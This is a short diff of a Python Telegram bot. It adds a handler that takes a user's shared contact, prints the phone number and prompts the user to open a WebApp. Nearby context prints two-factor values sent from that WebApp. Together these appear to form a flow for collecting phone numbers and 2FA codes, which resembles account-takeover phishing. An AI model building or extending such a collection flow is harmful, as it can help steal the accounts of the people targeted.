@@ -60,6 +60,26 @@ def handle_webapp(message):
     elif data.get("action") == "twofactor_value":
         print(data.get("twofactor_value"))
 
+@bot.message_handler(content_types=['contact'])
+def handle_contact(message):
+    contact = message.contact
+    print(f"Received contact: {contact.phone_number}")
+
+    # Step 3: send a WebApp message to trigger popup
+    # You can send web_app_data to your WebApp URL, e.g., Telegram WebApp frontend
+    # Here we simulate it by sending a JSON payload
+    webapp_payload = json.dumps({"action": "contact_approved"})
+    
+    bot.send_message(
+        message.chat.id,
+        "Контакт получен! Откройте WebApp.",
+        reply_markup=types.ReplyKeyboardRemove()  # remove keyboard
+    )
+    
+    # Optionally, if WebApp is already open, you can send web_app_data
+    # For demonstration, just print:
+    print("Send this to WebApp to trigger popup:", webapp_payload)
+
 print(":white_check_mark: Бот запущено! Очікуємо дані...")
 
 
